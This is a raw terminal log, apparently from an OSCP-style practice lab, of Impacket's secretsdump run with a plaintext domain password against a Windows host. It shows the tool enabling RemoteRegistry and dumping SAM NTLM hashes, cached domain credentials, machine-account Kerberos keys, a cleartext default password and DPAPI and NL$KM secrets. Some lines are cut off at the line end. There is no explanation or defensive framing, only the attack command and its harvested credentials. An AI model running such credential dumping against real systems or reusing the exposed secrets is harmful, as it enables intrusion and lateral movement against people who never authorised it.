
➜  autosmb git:(main) ✗ secretsdump.py oscp.exam/Eric.Wallows:'EricLikesRunning800'@192.168.1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-
OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-12-01 11:08:56+
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
OSCP\MS01$:aes256-cts-hmac-sha1-96:886e52bd8bbfc402422c759463492053590b83d91e1595324cd353e333
OSCP\MS01$:aes128-cts-hmac-sha1-96:dc8d814a585a93072e759851606abf98
OSCP\MS01$:des-cbc-md5:ab2feab320f43bf7
OSCP\MS01$:plain_password_hex:4dbc44435a829f744addd03d59977e27f1c6f1b04399abca0c61c903be7c81ffdcd7c59869b0eea5b1fb4a6849822d93bb5550aba32c0823e223059e118c5d5f1ae81843c2a13b23d4e4d653cebd02466cbe8c23a2fe34a9248cf45ada43afe548566d2ce
OSCP\MS01$:aad3b435b51404eeaad3b435b51404ee:06032770dd205bbf9bad8234d391b954:::
[*] DefaultPassword
oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
[*] DPAPI_SYSTEM
dpapi_machinekey:0x14cc9accbb06d4af8f07295749933b06cf0d6dfd
dpapi_userkey:0x4c31eb802e3529d34f198a0473a6745cf5948527
[*] NL$KM
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
➜  autosmb git:(main)